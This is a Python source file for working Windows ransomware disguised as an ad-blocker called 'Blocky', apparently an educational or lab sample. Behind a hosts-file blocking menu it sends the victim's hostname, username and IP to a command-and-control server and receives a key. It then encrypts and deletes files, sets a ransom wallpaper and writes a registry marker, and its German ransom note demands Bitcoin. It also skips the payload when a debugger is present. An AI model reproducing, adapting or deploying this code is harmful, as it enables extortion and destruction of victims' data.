# coding: utf-8

# Additional modules -> install via pip
import httpx  # Handling HTTP requests/responses
import nacl.secret  # Providing symmetric encryption
from python_hosts import Hosts, HostsEntry  # Providing fake Adblocker functionality

# Native modules
import pprint  # Handles pretty printing
import pathlib  # Handling file paths
import base64  # Handling base64 en/decoding
import os, sys  # Handling system related tasks (hostname/usernames)
import ctypes  # Calling Windows APIs
import winreg  # Editing Windows Registry
import threading  # Enabling Thread creation
import datetime  # Handling time-related data
from random import randint  # Random ints for 😴
from time import sleep  # 😴

# Variables
# Address of the remote C2 server
c2_url = "http://localhost:5000"
# List of paths. Every file in these lcoations will be encrypted ...
target_paths = [".\\toencrypt", ".\\toencrypt2"]
# ..except for the filetypes defined in the following list
exclude_types = (".exe", ".dll", ".img")


class BadThread(object):
    def __init__(self):
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()

    def run(self):
        fake_main()


class FakeBlocker:
    """This object imitates the functionality of an AdBlocker. The functionality should be to block
    Tracking & Malware Domains using Windows' internal hosts file, which requires Administrator rights
    to edit."""

    def __init__(self):
        self.hosts = Hosts()
        self.blocklists = {
            "1": (
                "steven-black",
                "https://raw.githubusercontent.com/StevenBlack/hosts/master/data/StevenBlack/hosts",
            ),
            "2": (
                "ad-away",
                "https://raw.githubusercontent.com/AdAway/adaway.github.io/master/hosts.txt",
            ),
            "3": (
                "energized-spark",
                "https://block.energized.pro/spark/formats/hosts.txt",
            ),
        }

    def is_admin(self):
        """Checks if the tool has been run with Admin privileges. Otherwise print error"""
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                return True
            else:
                print(
                    "Blocky needs Admin privileges to edit the Hosts-File. Please restart as Admin!"
                )
                return False
        except Exception as err:
            print(f"is_admin(): Error --> {err}")
            return False

    def initial_check(self):
        """Checks for existing Registry entries -> Maybe the tool has been here before?"""
        keyName = r"Software\Blocky\Main"
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
            )
            rnsm = Ransomware(resume=True)
            rnsm.victim_id = winreg.QueryValueEx(key, "ID")[0]
            print(
                "\n Du bist bereits mit der Blocky Ransomware infiziert!\n\nBitte nehme die Zahlung von 1 BTC an folgendes Wallet vor: bc1qtt04zfgjxg7lpqhk9vk8hnmnwf88ucwww5arsd\n\n Starte Blocky.exe erneut und lasse die Software laufen, sobald die Zahlung betätigt wurde. Deine Daten werden anschließend entschlüsselt."
            )
            rnsm.sync_loop()
        except:
            BadThread()
            blocky.show_menu()

    def show_menu(self):
        """Prints the Blocky menu and takes user input on menu selection"""
        print(
            f"\nWillkommen bei Blocky!\n\n Was möchtest du tun? \n\n\t1) Aktuelle Hosts-Einträge anschauen\n\t2) Blockierliste auswählen und hinzufügen\n\t3) Blocky beenden\n"
        )
        selection = input("Bitte gebe einen Menüpunkt an: ")
        if selection not in ["1", "2", "3"]:
            self.show_menu()
        elif selection == "1":
            self.show_hosts()
        elif selection == "2":
            self.add_blocklist()
        elif selection == "3":
            sys.exit()

    def show_hosts(self):
        """Prints a simple list of all entries in the local Hosts file"""
        pprint.PrettyPrinter().pprint(self.hosts)
        self.show_menu()

    def add_blocklist(self):
        """After the user selects on of the predefined blocklists, the corresponding entries will the added to the local Hosts file"""
        print(f"\nWelche Blockliste möchtest du hinzufügen?\n")
        pprint.PrettyPrinter().pprint(self.blocklists)
        selection = input("\nBitte wähle eine Liste aus: ")
        if selection in list(self.blocklists):
            self.hosts.import_url(url=self.blocklists[selection][1])
            self.hosts.write()
            print("Deine Hostliste wurde angepasst! Werbung wird nun blockiert!")
        else:
            self.add_blocklist()
        self.show_menu()


class Ransomware:
    """This object implements the core function and variables for the Ransomware"""

    def __init__(self, resume=False):
        # Get system info, if system has not been infected yet
        if not resume:
            self.public_ip = self.get_public_ip()
            self.firstContact = datetime.datetime.now()
            self.hostname, self.username = self.get_system_info()

        # Data which will be received by C2 server later on
        self.encryption_key = None
        self.victim_id = None

        # Our "safe" used to encrypt/decrypt data
        self.box = None

    def __str__(self):
        return f"IP: {self.public_ip}, Date: {self.firstContact}, Username: {self.username}, Hostname: {self.hostname}, Key: {self.encryption_key}, ID: {self.victim_id}"

    def get_public_ip(self):
        # Get public IP for the PC/network
        try:
            ip = httpx.get("https://ipconfig.io/ip", timeout=5).text.replace("\n", "")
            return ip
        except httpx.TimeoutException as err:
            print("get_public_ip(): Timeout Error --> ", err)
            return "0.0.0.0"
        except httpx.RequestError as err:
            print("get_public_ip(): Request Exception --> ", err)
            return "0.0.0.0"

    def get_system_info(self):
        # Get Username/Hostname via environment variables
        try:
            hostname = os.environ["COMPUTERNAME"]
            username = os.environ["USERNAME"]
            return hostname, username
        except KeyError as err:
            print("get_system_info(): Key Error --> ", err)
            return "generic_hostname", "generic_username"
        except OSError as err:
            print("get_system_info(): OS Error --> ", err)
            return "generic_hostname", "generic_username"

    def create_remote_entry(self):
        """Creates a DB entry for the new victim on the C2 server and receives encryption key & ID"""
        payload = {
            "username": (None, self.username),
            "hostname": (None, self.hostname),
            "ip": (None, self.public_ip),
        }
        # Send victim data via HTTP Form POST to the C2 server
        try:
            response = httpx.post(f"{c2_url}/create", files=payload)
        except httpx.TimeoutException as err:
            print("create_remote_entry(): Timeout Error --> ", err)
            sleep(60)
            response = httpx.post(f"{c2_url}/create", files=payload)
        except httpx.RequestError as err:
            print("create_remote_entry(): Request Exception --> ", err)
            response = httpx.post(f"{c2_url}/create", files=payload)
        # Receive encryption key and identifier via Response headers
        self.encryption_key = response.headers["victim-key"]
        self.victim_id = response.headers["victim-id"]
        bin_key = base64.b64decode(self.encryption_key)
        self.box = nacl.secret.SecretBox(bin_key)

    def create_registry_entry(self):
        keyName = r"Software\Blocky\Main"
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
            )
        except:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyName)
        winreg.SetValueEx(key, "ID", 0, winreg.REG_SZ, str(self.victim_id))
        winreg.CloseKey(key)

    def encrypt_file(self, filepath):
        """Takes a file path input and encrypts it using the box object of the Ransomware object"""
        try:
            if not os.path.isdir(filepath):
                # Take the original binary input of the file...
                with open(filepath, "rb") as original_file:
                    original_data = original_file.read()
                # ... encrypt it using the PyNaCl box provided by the parent object...
                encrypted_data = self.box.encrypt(original_data)
                # ... and write the encrypted binary data back in the original and newly created encrypted file.
                with open(f"{filepath}.rnsm", "wb") as encrypted_file:
                    encrypted_file.write(encrypted_data)
                with open(filepath, "wb") as original_file:
                    original_file.write(encrypted_data)
                # Lastly, remove the original file.
                os.remove(filepath)
        except Exception as err:
            print("encrypt_file(): Error --> ", err)

    def start_encryption(self):
        "Goes through each target location, filters out unwanted files and starts encryption on all files."
        for location in target_paths:
            try:
                # Check if each path actually exists
                if pathlib.Path(location).exists():
                    for path, subdirs, files in os.walk(location):
                        files = [fi for fi in files if not fi.endswith(exclude_types)]
                        for name in files:
                            filepath = os.path.join(path, name)
                            self.encrypt_file(filepath)
                            # print(f"🔒 Encrypted: {filepath}  -->  {filepath}.rnsm")
            except Exception as err:
                print("start_encryption(): Error --> ", err)
        self.encryption_key = None
        self.box = None

    def decrypt_file(self, filepath):
        """Takes a file path input and decrypts it using the box object of the Ransomware object"""
        try:
            if not os.path.isdir(filepath):
                # Take the encrypted binary input of the file...
                with open(filepath, "rb") as encrypted_file:
                    encrypted_data = encrypted_file.read()
                # ... decrypt it using the PyNaCl box provided by the parent object...
                original_data = self.box.decrypt(encrypted_data)
                # ... and write the original binary data back to the correct file path.
                filepath = filepath.replace(".rnsm", "")
                with open(f"{filepath}", "wb") as original_file:
                    original_file.write(original_data)
                # Lastly, remove the encrypted file.
                os.remove(f"{filepath}.rnsm")
        except Exception as err:
            print("decrypt_file(): Error --> ", err)

    def start_decryption(self):
        for location in target_paths:
            try:
                # Check if each path actually exists
                if pathlib.Path(location).exists():
                    for path, subdirs, files in os.walk(location):
                        files = [fi for fi in files if fi.endswith(".rnsm")]
                        for name in files:
                            filepath = os.path.join(path, name)
                            self.decrypt_file(filepath)
                            # print(f"🔓 Decrypted: {filepath}.rnsm  -->  {filepath}")
            except Exception as err:
                print("start_decryption(): Error --> ", err)

    def change_wallpaper(self, defaultWallpaper=False):
        "Change the wallpaper of the infected PC"
        if defaultWallpaper:
            try:
                image_path = "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg"
                ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
                return
            except FileNotFoundError as err:
                print("change_wallpaper(): FileNotFound Error --> ", err)
                return
            except Exception as err:
                print("change_wallpaper(): Error --> ", err)
                return
        try:
            response = httpx.get(f"{c2_url}/static/wp/{self.victim_id}.png")
        except httpx.TimeoutException as err:
            print("change_wallpaper(): Timeout Error --> ", err)
            sleep(60)
            response = httpx.get(f"{c2_url}/static/wp/{self.victim_id}.png")
        except httpx.RequestError as err:
            print("change_wallpaper(): Request Exception --> ", err)
            response = httpx.get(f"{c2_url}/static/wp/{self.victim_id}.png")
        image_path = f"C:\\Users\\{self.username}\\Desktop\\ransompaper.png"
        try:
            file = open(image_path, "wb")
            file.write(response.content)
            file.close()
            # print("🖼🖼🖼 Changing wallpaper...")
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
        except FileNotFoundError as err:
            print("change_wallpaper(): FileNotFound Error --> ", err)
        except Exception as err:
            print("change_wallpaper(): Error --> ", err)

    def setup_decryption(self):
        """Setup the PyNaCL box again, so that decryption can take place"""
        response = httpx.post(f"{c2_url}/check/{self.victim_id}")
        self.encryption_key = response.headers["Victim-Key"]
        bin_key = base64.b64decode(self.encryption_key)
        self.box = nacl.secret.SecretBox(bin_key)

    def sync_loop(self):
        # print("💲💲💲 Starting loop to check for payment receival...")
        while (
            httpx.post(f"{c2_url}/check/{self.victim_id}").headers["Payment-Received"]
            == "False"
        ):
            sleep(5)
            # print("😴 Syncing...")

        self.setup_decryption()
        self.start_decryption()
        self.change_wallpaper(defaultWallpaper=True)


class Threading(object):
    def __init__(self):
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()

    def run(self):
        fake_main()


def fake_main():
    """Main function responsible for rnsm functionality"""
    rnsm = Ransomware()
    rnsm.create_remote_entry()
    rnsm.create_registry_entry()
    rnsm.start_encryption()
    rnsm.change_wallpaper()
    rnsm.sync_loop()


def main():
    """Main function responsible for Blocky functionality"""
    blocky.show_menu()


if __name__ == "__main__":
    blocky = FakeBlocker()
    # Exit the programm, should it be run as non-Admin
    if not blocky.is_admin():
        sys.exit()
    # Directly jump into the fake functionality, should a debugger be detected, so no malicious activity is run
    if ctypes.windll.kernel32.IsDebuggerPresent():
        main()
    # Start check if system is already infected or not
    blocky.initial_check()

